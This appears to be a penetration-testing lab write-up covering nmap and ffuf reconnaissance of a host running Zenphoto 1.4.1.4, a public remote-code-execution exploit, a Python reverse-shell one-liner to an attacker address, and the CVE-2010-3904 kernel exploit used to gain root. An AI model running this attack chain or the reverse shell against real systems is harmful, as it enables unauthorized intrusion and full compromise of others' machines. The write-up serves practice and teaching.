## NMAP
```
sudo nmap -sC -sV -p- 192.168.68.41
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 20:25 CDT
Nmap scan report for 192.168.68.41
Host is up (0.042s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 8392abf2b76e27087ba9b872328ccc29 (DSA)
|_  2048 6577fa50fd4d9ef167e5cc0cc696f23e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 300.08 seconds
```

## Fuzzing
```
ffuf -u http://192.168.68.41/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -fc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.68.41/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

[Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 1695ms]
    * FUZZ: .hta

[Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 4397ms]
    * FUZZ: .htaccess

[Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 42ms]
    * FUZZ: cgi-bin/

[Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 5298ms]
    * FUZZ: .htpasswd

[Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 45ms]
    * FUZZ: index

[Status: 200, Size: 75, Words: 2, Lines: 5, Duration: 43ms]
    * FUZZ: index.html

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 45ms]
    * FUZZ: test

[Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 4546ms]
    * FUZZ: server-status

:: Progress: [4715/4715] :: Job [1/1] :: 57 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
                                                                                                 
```

Found the version of Zenphoto running on the server.

```
view-source:http://192.168.68.41/test/index.php
!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
<!-- Zenphoto script processing end:0.0669 seconds -->
```

Zenphoto exploit: https://www.exploit-db.com/exploits/18083

```php
php 18083.php 192.168.68.41 /test/         

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

```

I was able to get in and started a more stable shell with python
```sh
export RHOST="192.168.49.68";export RPORT=23;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

I then uploaded linpeas and found this exploit
```
[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c

```

https://github.com/R0B1NL1N/Linux-Kernel-Exploites/blob/master/2010/CVE-2010-3904/rds

Downloaded this and ran the exploit.

I was then root.